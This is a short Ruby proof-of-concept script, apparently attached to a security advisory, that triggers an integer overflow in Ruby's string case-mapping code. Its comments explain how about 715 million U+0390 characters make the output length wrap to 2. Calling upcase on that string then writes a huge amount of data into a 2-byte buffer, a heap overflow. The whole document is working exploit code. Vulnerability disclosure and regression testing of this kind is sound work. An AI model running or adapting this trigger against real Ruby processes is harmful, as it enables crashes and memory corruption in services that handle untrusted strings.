#!/usr/bin/env ruby
# GHSA-87fm-7w84-j2px: rb_str_casemap accumulates output length in a C int.
# 715_827_883 U+0390 (2 input bytes -> 6 output bytes) makes the total
# 2^32+2, so target_length wraps to 2 and the multi-buffer copy writes the
# full size_t amount of mapped data into a 2-byte Ruby string.
# Usage: RUBY script.rb [count]
$stdout.sync = true
count = Integer(ARGV.fetch(0, "715827883"))
warn "start count=#{count} input_bytes=#{count * 2} expected_out=#{count * 6}"
src = ("\u0390" * count).freeze
warn "source built bytes=#{src.bytesize}"
out = src.upcase
puts "count=#{count} out_len=#{out.bytesize}"
